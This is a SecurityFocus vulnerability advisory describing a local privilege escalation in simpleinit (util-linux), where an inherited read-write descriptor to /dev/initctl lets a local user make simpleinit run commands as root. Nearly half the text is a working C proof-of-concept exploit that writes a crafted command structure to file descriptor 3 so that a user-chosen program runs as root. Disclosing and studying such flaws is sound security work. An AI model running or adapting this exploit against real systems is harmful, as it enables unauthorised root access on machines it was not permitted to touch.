source: http://www.securityfocus.com/bid/5001/info

A vulnerability has been reported for simpleinit that may allow users to execute arbitrary commands as the superuser.

The vulnerability occurs because simpleinit may allow some child processes to inherit a file descriptor with read-write access. The file descriptor is used to access /dev/initctl and this descriptor is normally used by 'initctl', 'need' and 'provide' programs to pass instructions to simpleinit. The simpleinit process runs with root privileges.

A local user whose process inherits this file descriptor will be able to cause simpleinit to execute commands as the superuser.

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "simpleinit.h"  /* From the util-linux source */

int main()
{
   int fd = 3;
   char buf[COMMAND_SIZE];
   struct command_struct* cmd = (struct command_struct*) buf;

   memset(buf, '\0', sizeof(buf));
   cmd->command = COMMAND_NEED;
   cmd->pid = 17;
   cmd->ppid = 16;
   strcpy(cmd->name, "/home/pat/x/foo");  /* foo will be run as root */
   write(fd, buf, COMMAND_SIZE);
   return 0;
}